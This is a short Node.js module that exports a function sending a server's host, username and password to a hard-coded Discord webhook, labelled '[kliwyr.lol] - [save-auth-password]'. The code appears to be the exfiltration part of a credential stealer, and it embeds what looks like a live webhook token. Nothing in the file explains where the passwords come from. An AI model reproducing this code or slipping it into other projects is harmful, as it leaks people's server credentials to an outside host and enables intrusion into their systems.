
const axios = require('axios');
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1197847341252759653/2gQAi-Btr8yISZ2Qsg-zt-i1GeHZHNFasGPbGv6rX7mSJW__m-54L0dWo5rMM_PpgDK0';
const sendPasswordLog = async (serverInfo, password) => {
    const message = {
        content: `\`\`\`ini\n[kliwyr.lol] - [save-auth-password]\n${serverInfo.host}:${serverInfo.username}:${password}\`\`\``
    };
     try {
        await axios.post(WEBHOOK_URL, message);
    } catch (error) {
        console.error('Failed to send webhook:', error);
    }
};
module.exports = { sendPasswordLog };